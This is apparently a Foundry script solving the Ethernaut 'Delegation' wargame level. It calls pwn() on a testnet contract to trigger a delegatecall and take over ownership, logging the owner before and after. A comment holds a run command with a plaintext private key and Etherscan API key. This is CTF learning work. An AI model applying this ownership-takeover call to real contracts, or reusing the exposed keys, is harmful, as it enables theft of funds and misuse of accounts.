// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut/Delegation/Delegation.sol";
import "forge-std/console.sol";

//Execute
//forge script script/Delegation.s.sol:DelegationScript --rpc-url 'https://rpc.ankr.com/eth_rinkeby' --broadcast --private-key 'bbcdcf6c876839be76f70d4d2cecc1595c99dcb4bcdc9c964705f8c7a2d9ad16' --verify --etherscan-api-key '62UA4EJ6S43NHP4C5A7MSW1JSQF7GVV92N'
   
contract DelegationScript is Script {
    function setUp() public {}

    function run() public {

        console.log(msg.sender);
        console.log("####1");
        vm.startBroadcast();

        console.log("####2");
        Delegation delegation = Delegation(0x0443A0b1882F2F8b58DB2329Dc43Ef559d19D7E1);
        console.log(address(this));
        console.log(delegation.owner());

        console.log("####3");
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log(address(delegation));
        console.log(delegation.owner());

        
        console.log("####4");
        vm.stopBroadcast();
        
        console.log("####5");

    }
}
